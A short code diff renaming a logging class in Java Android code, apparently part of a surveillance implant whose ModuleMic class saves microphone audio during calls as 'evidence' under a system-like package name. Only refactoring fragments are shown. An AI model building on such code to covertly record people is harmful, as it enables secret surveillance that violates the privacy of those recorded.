@@ -26,7 +26,7 @@ import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.conf.ConfModule;
 import com.android.networking.evidence.EvidenceType;
-import com.android.networking.evidence.LogR;
+import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.file.AutoFile;
 import com.android.networking.interfaces.Observer;
 import com.android.networking.listener.ListenerCall;
@@ -288,7 +288,7 @@ public class ModuleMic extends BaseModule implements Observer<Call>, OnErrorList
 
 
 			if (data.length > 0) {
-				LogR.atomic(EvidenceType.MIC, getAdditionalData(), data);
+				EvidenceReference.atomic(EvidenceType.MIC, getAdditionalData(), data);
 			}
 
 		} else {
